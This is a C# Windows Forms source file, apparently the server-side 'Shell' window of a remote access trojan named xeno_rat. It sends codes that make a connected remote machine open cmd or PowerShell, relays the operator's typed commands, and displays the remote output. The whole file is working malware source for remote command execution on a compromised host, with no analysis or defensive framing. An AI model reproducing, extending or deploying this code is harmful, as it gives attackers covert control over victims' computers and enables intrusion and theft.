using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Shell : Form
    {
        private readonly Node client;

        public Shell(Node _client)
        {
            client = _client;
            InitializeComponent();
            Task.Run(RecvThread); // Start receiving messages in a separate thread
        }

        private async Task RecvThread()
        {
            while (client.Connected())
            {
                byte[] data = await client.ReceiveAsync();
                if (data == null)
                    break;

                // Update the UI in the main thread
                textBox1.BeginInvoke((Action)(() =>
                {
                    textBox1.AppendText(Encoding.UTF8.GetString(data) + Environment.NewLine);
                }));
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            await client.SendAsync(new byte[] { 1 }); // Send command to execute cmd
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            await client.SendAsync(new byte[] { 2 }); // Send command to execute powershell
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            // Send command entered in the text box
            await client.SendAsync(Encoding.UTF8.GetBytes(textBox2.Text));
            textBox2.Clear();
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.Handled = true;
                e.SuppressKeyPress = true;
                button3.PerformClick(); // Simulate click event of button3 (Enter key pressed)
            }
        }

        private void textBox1_VisibleChanged(object sender, EventArgs e)
        {
            if (textBox1.Visible)
            {
                textBox1.SelectionStart = textBox1.TextLength;
                textBox1.ScrollToCaret();
            }
        }
    }
}
